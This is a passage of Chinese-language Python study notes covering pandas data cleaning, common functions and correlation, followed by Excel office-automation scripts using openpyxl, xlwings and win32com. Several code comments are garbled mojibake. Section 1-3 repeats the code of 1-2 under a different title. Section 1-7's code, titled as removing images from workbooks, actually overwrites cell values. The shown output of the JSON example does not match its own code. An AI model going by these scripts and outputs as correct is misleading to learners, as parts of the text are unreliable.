- inplace：如果设置 True，将计算得到的值直接覆盖之前的值并返回 None，修改的是源数据。

我们可以通过 **isnull()** 判断各个单元格是否为空。

### 1-7-1 实例

```Python
import pandas as pd

df = pd.read_csv('property-data.csv')

print (df['NUM_BEDROOMS'])
print (df['NUM_BEDROOMS'].isnull())
```

![image-20240420152942097](Python超详细的学习笔记（3.0）.assets/image-20240420152942097.png)

以上例子中我们看到 Pandas 把 n/a 和 NA 当作空数据，na 不是空数据，不符合我们要求，我们可以指定空数据类型：

### 1-7-2 实例

```python
import pandas as pd

missing_values = ["n/a", "na", "--"]
df = pd.read_csv('property-data.csv', na_values = missing_values)

print (df['NUM_BEDROOMS'])
print (df['NUM_BEDROOMS'].isnull())
```

![image-20240420153024811](Python超详细的学习笔记（3.0）.assets/image-20240420153024811.png)

接下来的实例演示了删除包含空数据的行。

### 1-7-3 实例

```Python
import pandas as pd

df = pd.read_csv('property-data.csv')

new_df = df.dropna()

print(new_df.to_string())
```

以上实例输出结果如下：

![image-20240420153116570](Python超详细的学习笔记（3.0）.assets/image-20240420153116570.png)

**注意：**默认情况下，dropna() 方法返回一个新的 DataFrame，不会修改源数据。

如果你要修改源数据 DataFrame, 可以使用 **inplace = True** 参数:

### 1-7-4 实例

```python
import pandas as pd

df = pd.read_csv('property-data.csv')

df.dropna(inplace = True)

print(df.to_string())
```

以上实例输出结果如下：

![image-20240420153215273](Python超详细的学习笔记（3.0）.assets/image-20240420153215273.png)

我们也可以移除指定列有空值的行：

### 1-7-5 实例

移除 ST_NUM 列中字段值为空的行：

```python
import pandas as pd

df = pd.read_csv('property-data.csv')

df.dropna(subset=['ST_NUM'], inplace = True)

print(df.to_string())
```

以上实例输出结果如下：

![image-20240420153311172](Python超详细的学习笔记（3.0）.assets/image-20240420153311172.png)

我们也可以 **fillna()** 方法来替换一些空字段：

### 1-7-6 实例

使用 12345 替换空字段：

```Python
import pandas as pd

df = pd.read_csv('property-data.csv')

df.fillna(12345, inplace = True)

print(df.to_string())
```

以上实例输出结果如下：

![image-20240420153629179](Python超详细的学习笔记（3.0）.assets/image-20240420153629179.png)

我们也可以指定某一个列来替换数据：

### 1-7-7 实例

使用 12345 替换 PID 为空数据：

```python
import pandas as pd

df = pd.read_csv('property-data.csv')

df['PID'].fillna(12345, inplace = True)

print(df.to_string())
```

以上实例输出结果如下：

![image-20240420153729771](Python超详细的学习笔记（3.0）.assets/image-20240420153729771.png)

替换空单元格的常用方法是计算列的均值、中位数值或众数。

Pandas使用 **mean()**、**median()** 和 **mode()** 方法计算列的均值（所有值加起来的平均值）、中位数值（排序后排在中间的数）和众数（出现频率最高的数）。

### 1-7-8 实例

使用 mean() 方法计算列的均值并替换空单元格：

```python
import pandas as pd

df = pd.read_csv('property-data.csv')

x = df["ST_NUM"].mean()

df["ST_NUM"].fillna(x, inplace = True)

print(df.to_string())
```

以上实例输出结果如下，红框为计算的均值替换来空单元格：

![image-20240420153821087](Python超详细的学习笔记（3.0）.assets/image-20240420153821087.png)

### 1-7-9 实例

使用 median() 方法计算列的中位数并替换空单元格：

```python
import pandas as pd

df = pd.read_csv('property-data.csv')

x = df["ST_NUM"].median()

df["ST_NUM"].fillna(x, inplace = True)

print(df.to_string())
```

以上实例输出结果如下，红框为计算的中位数替换来空单元格：

![image-20240420153929756](Python超详细的学习笔记（3.0）.assets/image-20240420153929756.png)

### 1-7-10 实例

使用 mode() 方法计算列的众数并替换空单元格：

```python
import pandas as pd

df = pd.read_csv('property-data.csv')

x = df["ST_NUM"].mode()

df["ST_NUM"].fillna(x, inplace = True)

print(df.to_string())
```

以上实例输出结果如下，红框为计算的众数替换来空单元格：

![image-20240420154014570](Python超详细的学习笔记（3.0）.assets/image-20240420154014570.png)

### 1-7-11 pandas 清洗格式错误数据

数据格式错误的单元格会使数据分析变得困难，甚至不可能。

我们可以通过包含空单元格的行，或者将列中的所有单元格转换为相同格式的数据。

以下实例会格式化日期：

```python
import pandas as pd

# 第三个日期格式错误
data = {
  "Date": ['2020/12/01', '2020/12/02' , '20201226'],
  "duration": [50, 40, 45]
}

df = pd.DataFrame(data, index = ["day1", "day2", "day3"])

df['Date'] = pd.to_datetime(df['Date'], format='mixed')

print(df.to_string())
```

以上实例输出结果如下：

```
           Date  duration
day1 2020-12-01        50
day2 2020-12-02        40
day3 2020-12-26        45
```

### 1-7-12 Pandas 清洗错误数据

数据错误也是很常见的情况，我们可以对错误的数据进行替换或移除。

以下实例会替换错误年龄的数据：

```python
import pandas as pd

person = {
  "name": ['Google', 'Runoob' , 'Taobao'],
  "age": [50, 40, 12345]    # 12345 年龄数据是错误的
}

df = pd.DataFrame(person)

df.loc[2, 'age'] = 30 # 修改数据

print(df.to_string())
```

以上实例输出结果如下：

```
     name  age
0  Google   50
1  Runoob   40
2  Taobao   30
```

也可以设置条件语句：

将 age 大于 120 的设置为 120:

```python
import pandas as pd

person = {
  "name": ['Google', 'Runoob' , 'Taobao'],
  "age": [50, 200, 12345]    
}

df = pd.DataFrame(person)

for x in df.index:
  if df.loc[x, "age"] > 120:
    df.loc[x, "age"] = 120

print(df.to_string())
```

以上实例输出结果如下：

```
     name  age
0  Google   50
1  Runoob  120
2  Taobao  120
```

也可以将错误数据的行删除：

将 age 大于 120 的删除:

```python
import pandas as pd

person = {
  "name": ['Google', 'Runoob' , 'Taobao'],
  "age": [50, 40, 12345]    # 12345 年龄数据是错误的
}

df = pd.DataFrame(person)

for x in df.index:
  if df.loc[x, "age"] > 120:
    df.drop(x, inplace = True)

print(df.to_string())
```

以上实例输出结果如下：

```
     name  age
0  Google   50
1  Runoob   40
```

------

### 1-7-13 Pandas 清洗重复数据

如果我们要清洗重复数据，可以使用 **duplicated()** 和 **drop_duplicates()** 方法。

如果对应的数据是重复的，**duplicated()** 会返回 True，否则返回 False。

```python
import pandas as pd

person = {
  "name": ['Google', 'Runoob', 'Runoob', 'Taobao'],
  "age": [50, 40, 40, 23]  
}
df = pd.DataFrame(person)

print(df.duplicated())
```

以上实例输出结果如下：

```
0    False
1    False
2     True
3    False
dtype: bool
```

删除重复数据，可以直接使用**drop_duplicates()** 方法。

```python
import pandas as pd

persons = {
  "name": ['Google', 'Runoob', 'Runoob', 'Taobao'],
  "age": [50, 40, 40, 23]  
}

df = pd.DataFrame(persons)

df.drop_duplicates(inplace = True)
print(df)
```

以上实例输出结果如下：

```
     name  age
0  Google   50
1  Runoob   40
3  Taobao   23
```

## 1-8 Pandas 常用函数

### 1-8-1 读取数据

![image-20240420154404826](Python超详细的学习笔记（3.0）.assets/image-20240420154404826.png)

```python
import pandas as pd

# 从 CSV 文件中读取数据
df = pd.read_csv('data.csv')

# 从 Excel 文件中读取数据
df = pd.read_excel('data.xlsx')

# 从 SQL 数据库中读取数据
import sqlite3
conn = sqlite3.connect('database.db')
df = pd.read_sql('SELECT * FROM table_name', conn)

# 从 JSON 字符串中读取数据
json_string = '{"name": "John", "age": 30, "city": "New York"}'
df = pd.read_json(json_string)

# 从 HTML 页面中读取数据
url = 'https://www.runoob.com'
dfs = pd.read_html(url)
df = dfs[0] # 选择第一个数据框
```

### 1-8-2 查看数据

![image-20240420154453743](Python超详细的学习笔记（3.0）.assets/image-20240420154453743.png)

```python
# 显示前五行数据
df.head()

# 显示后五行数据
df.tail()

# 显示数据信息
df.info()

# 显示基本统计信息
df.describe()

# 显示数据的行数和列数
df.shape
```

```python
import pandas as pd

data = [
    {"name": "Google", "likes": 25, "url": "https://www.google.com"},
    {"name": "Runoob", "likes": 30, "url": "https://www.runoob.com"},
    {"name": "Taobao", "likes": 35, "url": "https://www.taobao.com"}
]

df = pd.DataFrame(data)
# 显示前两行数据
print(df.head(2))
# 显示前最后一行数据
print(df.tail(1))
```

以上实例输出结果为：

```
     name  likes                     url
0  Google     25  https://www.google.com
1  Runoob     30  https://www.runoob.com
     name  likes                     url
2  Taobao     35  https://www.taobao.com
```

### 1-8-3 数据清洗

![image-20240420154550411](Python超详细的学习笔记（3.0）.assets/image-20240420154550411.png)

```python
# 删除包含缺失值的行或列
df.dropna()

# 将缺失值替换为指定的值
df.fillna(0)

# 将指定值替换为新值
df.replace('old_value', 'new_value')

# 检查是否有重复的数据
df.duplicated()

# 删除重复的数据
df.drop_duplicates()
```

### 1-8-4 数据选择和切片

![image-20240420154625865](Python超详细的学习笔记（3.0）.assets/image-20240420154625865.png)

```python
# 选择指定的列
df['column_name']

# 通过标签选择数据
df.loc[row_index, column_name]

# 通过位置选择数据
df.iloc[row_index, column_index]

# 通过标签或位置选择数据
df.ix[row_index, column_name]

# 选择指定的列
df.filter(items=['column_name1', 'column_name2'])

# 选择列名匹配正则表达式的列
df.filter(regex='regex')

# 随机选择 n 行数据
df.sample(n=5)
```

### 1-8-5 数据排序

![image-20240420154708794](./Python超详细的学习笔记（3.0）.assets/image-20240420154708794.png)

```python
# 按照指定列的值排序
df.sort_values('column_name')

# 按照多个列的值排序
df.sort_values(['column_name1', 'column_name2'], ascending=[True, False])

# 按照索引排序
df.sort_index()
```

### 1-8-6 数据分组和聚合

![image-20240420154742880](Python超详细的学习笔记（3.0）.assets/image-20240420154742880.png)

```python
# 按照指定列进行分组
df.groupby('column_name')

# 对分组后的数据进行聚合操作
df.aggregate('function_name')

# 生成透视表
df.pivot_table(values='value', index='index_column', columns='column_name', aggfunc='function_name')
```

### 1-8-7 数据合并

![image-20240420154830772](Python超详细的学习笔记（3.0）.assets/image-20240420154830772.png)

```python
# 将多个数据框按照行或列进行合并
df = pd.concat([df1, df2])

# 按照指定列将两个数据框进行合并
df = pd.merge(df1, df2, on='column_name')
```

### 1-8-8 数据选择和过滤

![image-20240420154903762](Python超详细的学习笔记（3.0）.assets/image-20240420154903762.png)

### 1-8-9 数据统计和描述

![image-20240420154928146](Python超详细的学习笔记（3.0）.assets/image-20240420154928146.png)

### 1-8-10 实例

假设我们有如下的 JSON 数据，数据保存到 **data.json** 文件：

```json
[
  {
    "name": "Alice",
    "age": 25,
    "gender": "female",
    "score": 80
  },
  {
    "name": "Bob",
    "age": null,
    "gender": "male",
    "score": 90
  },
  {
    "name": "Charlie",
    "age": 30,
    "gender": "male",
    "score": null
  },
  {
    "name": "David",
    "age": 35,
    "gender": "male",
    "score": 70
  }
]
```

我们可以使用 Pandas 读取 JSON 数据，并进行数据清洗和处理、数据选择和过滤、数据统计和描述等操作，具体如下：

```python
import pandas as pd

# 读取 JSON 数据
df = pd.read_json('data.json')

# 删除缺失值
df = df.dropna()

# 用指定的值填充缺失值
df = df.fillna({'age': 0, 'score': 0})

# 重命名列名
df = df.rename(columns={'name': '姓名', 'age': '年龄', 'gender': '性别', 'score': '成绩'})

# 按成绩排序
df = df.sort_values(by='成绩', ascending=False)

# 按性别分组并计算平均年龄和成绩
grouped = df.groupby('性别').agg({'年龄': 'mean', '成绩': 'mean'})

# 选择成绩大于等于90的行，并只保留姓名和成绩两列
df = df.loc[df['成绩'] >= 90, ['姓名', '成绩']]

# 计算每列的基本统计信息
stats = df.describe()

# 计算每列的平均值
mean = df.mean()

# 计算每列的中位数
median = df.median()

# 计算每列的众数
mode = df.mode()

# 计算每列非缺失值的数量
count = df.count()
```

输出结果如下：

```
# df
   姓名  年龄 性别  成绩
1  Bob   0  male  90

# grouped
             年龄  成绩
性别                
female  25.000000  80
male    27.500000  80

# stats
         成绩
count   1.0
mean   90.0
std     NaN
min    90.0
25%    90.0
50%    90.0
75%    90.0
max    90.0

# mean
成绩    90.0
dtype: float64

# median
成绩    90.0
dtype: float64

# mode
    姓名    成绩
0  Bob  90.0

# count
姓名    1
成绩    1
dtype: int64
```

## 1-9 Pandas 相关性分析

- 在 Pandas 中，数据相关性分析是通过计算不同变量之间的相关系数来了解它们之间的关系。
- 在 Pandas 中，数据相关性是一项重要的分析任务，它帮助我们理解数据中各个变量之间的关系。
- Pandas 使用 **corr()** 方法计算数据集中每列之间的关系。

```
df.corr(method='pearson', min_periods=1)
```

- **method** (可选): 字符串类型，用于指定计算相关系数的方法。默认是 'pearson'，还可以选择 'kendall'（Kendall Tau 相关系数）或 'spearman'（Spearman 秩相关系数）。
- **min_periods** (可选): 表示计算相关系数时所需的最小观测值数量。默认值是 1，即只要有至少一个非空值，就会进行计算。如果指定了 `min_periods`，并且在某些列中的非空值数量小于该值，则相应列的相关系数将被设为 NaN。

**df.corr()** 方法返回一个相关系数矩阵，矩阵的行和列对应数据框的列名，矩阵的元素是对应列之间的相关系数。

常见的相关性系数包括 Pearson 相关系数和 Spearman 秩相关系数：

- **Pearson 相关系数:** 即皮尔逊相关系数，用于衡量了两个变量之间的线性关系强度和方向。它的取值范围在 -1 到 1 之间，其中 -1 表示完全负相关，1 表示完全正相关，0 表示无线性相关。可以使用 **corr()** 方法计算数据框中各列之间的 Pearson 相关系数。
- **Spearman 相关系数：**即斯皮尔曼相关系数，是一种秩相关系数。用于衡量两个变量之间的单调关系，即不一定是线性关系。它通过比较变量的秩次来计算相关性。可以使用 **corr(method='spearman')** 方法计算数据框中各列之间的 Spearman 相关系数。

**Pearson 相关系数**

```python
import pandas as pd

# 创建一个示例数据框
data = {'A': [1, 2, 3, 4, 5], 'B': [5, 4, 3, 2, 1]}
df = pd.DataFrame(data)

# 计算 Pearson 相关系数
correlation_matrix = df.corr()
print(correlation_matrix)
```

输出结果：

```
     A    B
A  1.0 -1.0
B -1.0  1.0
```

**说明**：由于数据集是线性相关的，因此 Pearson 相关系数矩阵对角线上的值为 1，而非对角线上的值为 -1 表示完全负相关。

**Spearman 秩相关系数**

```python
import pandas as pd

# 创建一个示例数据框
data = {'A': [1, 2, 3, 4, 5], 'B': [5, 4, 3, 2, 1]}
df = pd.DataFrame(data)

# 计算 Spearman 相关系数
spearman_correlation_matrix = df.corr(method='spearman')
print(spearman_correlation_matrix)
```

输出结果：

```
     A    B
A  1.0 -1.0
B -1.0  1.0
```

**说明：**Spearman 相关系数矩阵的结果与 Pearson 相关系数矩阵相同，因为这两个变量之间是完全的单调负相关。

**可视化相关性**

这里我们要使用 Python 的 Seaborn 库， Seaborn 是一个基于 Matplotlib 的数据可视化库，专注于统计图形的绘制，旨在简化数据可视化的过程。

Seaborn 提供了一些简单的高级接口，可以轻松地绘制各种统计图形，包括散点图、折线图、柱状图、热图等，而且具有良好的美学效果。

安装 Seaborn：

```python
pip install seaborn
```

```python
import seaborn as sns
import matplotlib.pyplot as plt
import pandas as pd

# 创建一个示例数据框
data = {'A': [1, 2, 3, 4, 5], 'B': [5, 4, 3, 2, 1]}
df = pd.DataFrame(data)

# 计算 Pearson 相关系数
correlation_matrix = df.corr()
# 使用热图可视化 Pearson 相关系数
sns.heatmap(correlation_matrix, annot=True, cmap='coolwarm', fmt=".2f")
plt.show()
```

# 二十一，Python办公自动化项目

## 1-1 一键提取PDF中的表格到Excel

**所用到的资料请到相应资料目录里找**

![image-20240719091427508](Python超详细的学习笔记（5.0）.assets/image-20240719091427508.png)

```python
#读取xls文件中的数据
import xlrd

file = "原表.xls"
wb = xlrd.open_workbook(file) #读取工作簿
ws = wb.sheets()[0] #选第一个工作表
data = []

for row in range(7, ws.nrows):
    name = ws.cell(row, 1).value.strip() #科室名称
    total1 = ws.cell(row, 2).value #总计
    total2 = ws.cell(row, 3).value #计
    avg = ws.cell(row, 20).value #平均每日人次
    
    info_list=[name,total1,total2,avg]

    if info_list[0] != "": #去除空数据
        data.append(info_list)

from openpyxl import load_workbook
from openpyxl.styles import Border, Side, PatternFill, Font, GradientFill, Alignment #设置单元格格式
thin = Side(border_style="thin", color="000000")#定义边框粗细及颜色

file = "统计表模板.xlsx"
wb = load_workbook(file)
ws = wb.active

#写入数据
for i in data:
    ws.append(i)
    
#设置字号，对齐，缩小字体填充，加边框
#Font(bold=True)可加粗字体
for row_number in range(3, ws.max_row+1):    
    ws.row_dimensions[row_number].height = 25 #设置行高
    for col_number in range(1,5):
        c = ws.cell(row=row_number,column=col_number)
        c.font = Font(size=11,bold=True)
        c.border = Border(top=thin, left=thin, right=thin, bottom=thin)
        c.alignment = Alignment(horizontal="center", vertical="center")
    
wb.save("统计表.xlsx")
```

## 1-2  使用pandas提取制定数据，并保存在原Excel中

```Python
import pandas as pd
df = pd.read_excel("物料表.xlsx", header  = 2)

df500 = df[df["数量"]>500]

with pd.ExcelWriter('物料表.xlsx', mode = 'a' ,engine='openpyxl',
                    datetime_format='YYYY-MM-DD') as writer:
    df500.to_excel(writer, sheet_name='数量大于500',index = False)

from openpyxl import load_workbook
from openpyxl.styles import Border, Side, PatternFill, Font, GradientFill, Alignment
thin = Side(border_style="thin", color="000000")#定义边框粗细及颜色

wb = load_workbook("物料表.xlsx")
ws = wb["数量大于500"]

# 调整列宽
ws.column_dimensions['A'].width = 12
ws.column_dimensions['C'].width = 15.5
ws.column_dimensions['G'].width = 10

#设置字号，对齐，缩小字体填充，加边框
for row_number in range(2, ws.max_row+1):
    for col_number in range(1,ws.max_column+1):
        c = ws.cell(row=row_number,column=col_number)
        c.font = Font(size=10)
        c.border = Border(top=thin, left=thin, right=thin, bottom=thin)
        c.alignment = Alignment(horizontal="left", vertical="center")
wb.save("物料表.xlsx")
```

## 1-3 多路径多Excel中获取数据，并存入新表

```python
import pandas as pd
df = pd.read_excel("物料表.xlsx", header  = 2)

df500 = df[df["数量"]>500]

with pd.ExcelWriter('物料表.xlsx', mode = 'a' ,engine='openpyxl',
                    datetime_format='YYYY-MM-DD') as writer:
    df500.to_excel(writer, sheet_name='数量大于500',index = False)

from openpyxl import load_workbook
from openpyxl.styles import Border, Side, PatternFill, Font, GradientFill, Alignment
thin = Side(border_style="thin", color="000000")#定义边框粗细及颜色

wb = load_workbook("物料表.xlsx")
ws = wb["数量大于500"]

# 调整列宽
ws.column_dimensions['A'].width = 12
ws.column_dimensions['C'].width = 15.5
ws.column_dimensions['G'].width = 10

#设置字号，对齐，缩小字体填充，加边框
for row_number in range(2, ws.max_row+1):
    for col_number in range(1,ws.max_column+1):
        c = ws.cell(row=row_number,column=col_number)
        c.font = Font(size=10)
        c.border = Border(top=thin, left=thin, right=thin, bottom=thin)
        c.alignment = Alignment(horizontal="left", vertical="center")
wb.save("物料表.xlsx")
```

## 1-4 保留格式复制多个Excel工作表到汇总表

```python
import os #用于获取目标文件所在路径
import win32com

path=os.getcwd()+"\\文件\\" # 文件夹绝对路径
files=[]
for file in os.listdir(path):
    if file.endswith(".xls") or file.endswith(".xlsx"): #只获取".xls"后缀的文件
        files.append(path+file) 


excel_app = win32com.client.Dispatch("Excel.Application")
excel_app.Visible = False  # 不显示Excel文件
excel_app.DisplayAlerts = False

#新建excel工作簿
wb = excel_app.Workbooks.Add()
wb.SaveAs(os.getcwd() + "\\汇总.xlsx")
ws = wb.Worksheets(1)
ws.Name = "目录"
for i in range(len(files)):
    file_name = files[i].split("\\")[-1].split(".")[0]
    ws.Range("A"+str(i+1)).Value = file_name
    #读取子文件
    wb_sub = excel_app.Workbooks.Open(files[i])
    ws_sub = wb_sub.ActiveSheet # #获取活动工作表

    ws_sub.Copy(ws) #复制工作表到汇总表
    wb.ActiveSheet.Name = file_name #更改工作表名
    wb_sub.Close()
    print(f"已复制文件 {file_name}")


#将“目录”工作表移动到最前面
first_sheet = files[0].split("\\")[-1].split(".")[0]
wb.Worksheets("目录").Move(wb.Worksheets(first_sheet))    

wb.Save()
wb.Close()
excel_app.Quit()
```

## 1-5 分类汇总Excel表中的数据

```python
import pandas as pd

#新建一个DataFrame用于存储汇总所有工作表的结果
result = pd.DataFrame()

#读取整个Excel文件中的所有表
df = pd.read_excel('日领料单.xlsx', header=2, sheet_name = None)
#按表名遍历，处理数据
for sheet_name in df.keys():    
    #按物料编号加总领料数量
    df_sum = df[sheet_name].groupby(['物料编号','物料描述'])['批号批数量'].sum().reset_index()    

    result = pd.concat([result,df_sum])
    
final = result.groupby(['物料编号','物料描述'])['批号批数量'].sum().reset_index().sort_values('批号批数量',ascending = False)
final.to_excel("汇总.xlsx")
```

## 1-6 Python将Excel中的行转置

```python
# 导入xlwings库，主要用于在python中操作Microsoft Excel。
# 1.与 Excel 的集成：
# xlwings 提供了与 Excel 应用程序的直接集成，可以通过 Python 脚本控制 Excel 的各种操作，包括打开、保存、修改工作簿和工作表等。
# 读写 Excel 数据：
# 2.可以轻松地读取 Excel 文件中的数据到 Python 中进行进一步处理，或者将 Python 中的数据写入 Excel 文件。
# 操作 Excel 对象模型：
# 3.xlwings 允许直接访问 Excel 的对象模型，如工作簿、工作表、单元格等，可以对它们进行灵活的操作，例如格式设置、插入数据、删除数据等。
# 自动化任务：
# 4.可以利用 xlwings 编写脚本来自动化执行 Excel 中的任务，比如生成报表、数据分析、批量处理等，提高工作效率和准确性。
# 与其他 Python 库的结合：
# xlwings 可以与其他 Python 库（如 pandas、NumPy 等）结合使用，使得在 Excel 中进行复杂的数据分析和处理变得更加方便和高效。
# 跨平台性：
#
# xlwings 支持在 Windows 和 macOS 系统上运行，并且不依赖于 Excel 的版本，因此可以很好地适应不同的工作环境和需求。
import xlwings as xw

# （启动Excel应用程序）
# visible=False 表示 Excel 应用程序在后台运行，不显示界面。
# add_book=False 表示不自动添加新的工作簿，而是手动打开已存在的工作簿。
app = xw.App(visible=False, add_book=False)

# （指定打开指定的excel文件）这里的路径 C:\Users\Administrator\Desktop\aaa\aaa.xlsx 需要根据实际情况修改，它是要操作的 Excel 文件的路径。
# workbook 变量现在引用了打开的 Excel 工作簿。
workbook = app.books.open(r'C:\Users\Administrator\Desktop\aaa\aaa.xlsx') #修改此路径，excel所在路径
# （选择工作表）sheets[0] 表示选择工作簿中的第一个工作表（索引从0开始）。
worksheet = workbook.sheets[0]
# （读取数据）
# worksheet.range('A1') 表示从工作表的 A1 单元格开始。
# .expand('table') 扩展到包含表格的范围。
# .options(transpose=True) 转置数据，使得行变为列，列变为行。
# .value 获取范围中的值，并将其赋给 data 变量。
data = worksheet.range('A1').expand('table').options(transpose=True).value
# （清楚工作簿内容）清楚工作表中的所有内容
worksheet.clear()
# 将转换后的数据写入工作表：
# worksheet.range('A1').expand() 表示从 A1 单元格开始的范围。
# .value = data 将之前读取并转置的数据 data 写入到工作表中。
worksheet.range('A1').expand().value = data
# （保存工作簿）
# 这里的路径 C:\Users\Administrator\Desktop\aaa\bbb.xlsx 是要将转换后的 Excel 文件保存的路径。确保路径存在并且有写入权限。
workbook.save(r'C:\Users\Administrator\Desktop\aaa\bbb.xlsx') #修改此路径，要将转换后的excel存到哪里
# （关闭工作簿）关闭当前操作的工作簿
workbook.close()
# （退出Excel应用程序）退出 xlwings 中的 Excel 应用程序，释放资源并关闭 Excel 进程。
app.quit()
```

## 1-7  批量去重多个Excel中的图片

```python
# python批量去除多个excel的图片
from xlrd import open_workbook
from xlutils.copy import copy
import os

def editExl(path, name):
    if os.path.exists('/aaa'): #在py文件目录会自动创建aaa文件夹，并且生成去图的xls文件
        os.removedirs("/aaa")  #在py文件目录会自动创建aaa文件夹，并且生成去图的xls文件
    # 括号里放入要读取的文件的绝对路径,相对路径也可以
    # os.getcwd() 返回当前.py文件所在的绝对路径
    # print(os.getcwd(), 'lujing')
    wb = open_workbook(path + '/' + name)
    # 获取所读取文件的第一张表单
    # sheet = wb.sheet_by_index(0)
    # 获取该表单的行数
    # s = sheet.nrows

    # 获取当前文件的工作表（sheet）list
    sheetList = wb.sheets()
    # print('sheetList', sheetList)

    # 复制原文件，因为原文件只能读取，不能写入数据，所以要复制得到一个可以写入数据的文件
    newwb = copy(wb)
    sheetIndex = 0
    for sheet in sheetList:

        # 获取可写文件的第一张表单
        newsheet = newwb.get_sheet(sheetIndex)
        # print(newsheet, newsheet.get_rows())
        index = 0
        try:
            for row in sheet.get_rows():
                # 遍历每一行，当8列的值小于12时，就把该值改为0
                # print(row)
                # print(row[0].value, '000000000000000')
                if row[0].value < 12:
                    # print('here', index)
                    newsheet.write(index, 0, 0)
                    # print('after here')
                index = index + 1
        except:
            print("aaa")
        sheetIndex = sheetIndex + 1

    mkdir('./aaa')  #在py文件目录会自动创建aaa文件夹，并且生成去图的xls文件
    newwb.save('./aaa/' + name)  #在py文件目录会自动创建aaa文件夹，并且生成去图的xls文件

def mkdir(path):
    folder = os.path.exists(path)
    if not folder:
        os.makedirs(path)
        print('--- folder mk ---')
    else:
        print('--- folder exists ---')

def getFileList(path):
    return os.listdir(path)

def editAll():
    originPath = './bbb' #在py文件的目录内新建目录bbb，将xls文件放入，修改此处即可
    fileList = getFileList(originPath)
    # print(fileList)
    for fileItem in fileList:
        editExl(originPath, fileItem)
editAll()
```

## 1-8 Python批量合并Excel文件

```python
# -*- coding: utf-8 -*-
from openpyxl import load_workbook, Workbook
import glob

path = "C:\\Users\\Administrator\\Desktop\\bbb"  #�޸ģ����excel�ļ���·����
new_workbook = Workbook()
new_sheet = new_workbook.active #��ȡ���


# ��flag������ȷ�±��Ƿ��Ѿ�����˱�ͷ��ֻҪ��ӹ�һ�ξ������ظ������
flag = 0


for file in glob.glob(path + '/*.xlsx'): #glob������ͨ���ƥ��·��
    workbook = load_workbook(file)  #����excel�ļ�
    sheet = workbook.active #��ȡ���


    coloum_A = sheet['A'] #��A�п�ʼ
    row_lst = []
    for cell in coloum_A:
        if cell:
            print(cell.row)
            row_lst.append(cell.row)
 
 
    if not flag:
        header = sheet[1]
        header_lst = []
        for cell in header:
            header_lst.append(cell.value)
        new_sheet.append(header_lst)
        flag = 1
 
 
    for row in row_lst:
        data_lst = []
        for cell in sheet[row]:
            data_lst.append(cell.value)
        new_sheet.append(data_lst)

new_workbook.save(path + '/' + '����ɸѡ�������±�.xlsx') #��˼����C:\Users\Administrator\Desktop\bbb\����ɸѡ�������±�.xlsx
```

## 1-9 批量合并一个工作表中的多个表

```python
#python�����ϲ�һ���������Ķ����

import pandas as pd

file_name = 'C:\\Users\\Administrator\\Desktop\\bbb\\��1.xlsx' #Ҫ�ϲ��ı��·����Ҫ�޸�
data = pd.read_excel("C:\\Users\\Administrator\\Desktop\\bbb\\��1.xlsx".format(file_name))
df = pd.ExcelFile("C:\\Users\\Administrator\\Desktop\\bbb\\��1.xlsx".format(file_name.split(".")[0]))
df_new = pd.DataFrame()

for name in df.sheet_names: #��ȡÿ��Sheetҳ������
    print(name)
    df_pre = df.parse(sheet_name=name, dtype={'columns_name':str}) #ѭ����ȡÿ��Sheet�����ݣ�ͬʱ����ĳ��Ϊ�ַ��������ⳤ�����ı���ʶ��Ϊ����
    print(df_pre)
    df_pre["sheet��"] = name
    print(df_pre)
    df_new = df_new.append(df_pre)
df_new.to_excel('C:\\Users\\Administrator\\Desktop\\bbb\\��2.xlsx'.format(file_name.split(".")[0]),index=False) #
```

## 1-10 批量找到某个数据，并整理成新的表格

```Python
from openpyxl import load_workbook, Workbook
filepath = r'C:\Users\Administrator\Desktop\aaa.xlsx' # ��Ҫ�޸�:�ܱ��·��
workbook = load_workbook(filepath)

new_workbook = Workbook()  # �����µ�Excel��������ȡ��������
new_sheet = new_workbook.active

new_headers = ['���', '��ֵ']  #���±�д���ͷ
new_sheet.append(new_headers)

for i in workbook.sheetnames:
        sheet = workbook[i]
        names = sheet['A']  #����һ�м���
        flag = 0
        for cell in names:
            if cell.value == "c":  #��Ҫ�޸ģ������"c"����Ҫ��ȡ�����ݱ�ǩ
                flag = cell.row
                break
        if flag:   # ���flagû�б��޸�����Ҫ˳��������д���
            data_lst = []
            for cell in sheet[flag]:
                if cell.value: # �������һ�������ݵ��жϣ����������ݵ���ֱ�ӷſգ�������д��һ��none
                    data_lst.append(str(cell.value))
                else:
                    data_lst.append(' ')
            new_sheet.append(data_lst)
        new_workbook.save(r'C:\Users\Administrator\Desktop\bbb.xlsx')  #��Ҫ�޸ģ��µĹ����ѱ��浽���
```

## 1-11 Python批量打印工作簿

```python
#������ӡ������
import os
import xlwings as xw
file_path = 'C:\\Users\\Administrator\\Desktop\\aaa'
file_list = os.listdir(file_path)
sheet_name = 'Sheet1' #ÿ����������Ҫ��ӡ�Ĺ������������޸�
app = xw.App(visible = False, add_book = False)
for i in file_list:
    if i.startswith('~$'):
        continue
    file_paths = os.path.join(file_path, i)
    workbook = app.books.open(file_paths)
    for j in workbook.sheets:
        if j.name == sheet_name:
            j.api.PrintOut()
            break
app.quit()
```

## 1-12 批量打开一个文件夹下面的所有工作簿

```python
#批量打开一个文件夹下的所有工作簿
import os
import xlwings as xw
file_path = 'C:\\Users\\Administrator\\Desktop\\aaa' #要打开的excel文件夹
file_list = os.listdir(file_path)
app = xw.App(visible = True, add_book = False)
for i in file_list:
    if os.path.splitext(i)[1] == '.xlsx':
        app.books.open(file_path + '\\' + i)
```

## 1-13 Python批量新建并保存工作簿

```python
#python批量新建并保存工作簿
import xlwings as xw
app = xw.App(visible = True, add_book = False)
for i in range(6):  #新建6个excel文件
    workbook = app.books.add()
    workbook.save(f'C:\\Users\\Administrator\\Desktop\\aaa\\test{i}.xlsx') #修改路径，并且test可以改成自己想要的文件前缀
    workbook.close()
app.quit()

```

## 1-14 Python批量修改200个Excel中的内容

```python
from openpyxl import load_workbook
wb = load_workbook("data\领料单（每日）.xlsx")
sheet_names=wb.get_sheet_names() #获得工作簿的所有工作表名
for sheet_name in sheet_names: #遍历每个工作表，更改A4单元格的数据
    ws=wb[sheet_name]
    ws['A4'].value="零件测试领料单" #直接将A4单元格的值改为需要的
wb.save("data\领料单（每日）-更改后.xlsx")

```

## 1-15 批量修改工作簿的时间格式

```python
'''
批量更改多个工作簿的时间格式，如将2022年5月1号改成5/1
'''
import os
import xlwings as xw

file_path = 'C:\\Users\\Administrator\\Desktop\\aaa' #所有excel存放的路径，要修改
file_list = os.listdir(file_path)  # 文件名列表
app = xw.App(visible=False, add_book=False)  # 打开Excel
for i in file_list:  # 遍历工作簿
